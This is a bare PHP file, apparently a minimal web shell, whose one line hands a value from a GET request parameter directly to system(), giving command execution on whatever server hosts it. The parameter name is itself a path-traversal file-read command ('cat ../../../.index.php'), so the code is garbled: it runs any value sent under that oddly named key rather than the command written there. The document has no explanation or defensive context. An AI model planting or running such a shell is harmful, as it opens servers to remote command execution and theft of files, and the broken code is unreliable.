<?php
system($_GET['cat ../../../.index.php']);
?>
